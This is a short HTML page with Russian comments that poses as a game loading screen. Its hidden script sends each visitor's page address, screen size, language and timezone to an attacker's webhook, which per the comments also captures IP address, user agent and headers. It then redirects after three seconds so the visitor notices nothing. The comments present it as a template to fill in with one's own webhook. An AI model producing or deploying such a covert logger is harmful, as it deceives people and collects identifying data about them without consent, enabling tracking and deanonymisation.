<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Загрузка...</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .box{text-align:center}
  .spin{width:48px;height:48px;border:4px solid #333;border-top-color:#2a6;
        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
  @keyframes s{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="box">
  <div class="spin"></div>
  <p>Загружаем игру...</p>
</div>

<script>
// замени на свой webhook URL (webhook.site и т.п.)
const HOOK = "https://webhook.site/ТВОЙ-UUID";

// 1) шлём «пинг» — webhook запишет IP, UA, заголовки
fetch(HOOK, {
  method: "POST",
  mode: "no-cors",              // не падаем на CORS, ответ нам не нужен
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({
    event: "visit",
    page: location.href,
    ts: new Date().toISOString(),
    screen: `${screen.width}x${screen.height}`,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone
  })
}).catch(()=>{});

// 2) через 3 секунды «игра» открывается — человек ничего не заметил
setTimeout(() => { location.href = "https://example.com/игра"; }, 3000);
</script>
</body>
</html>
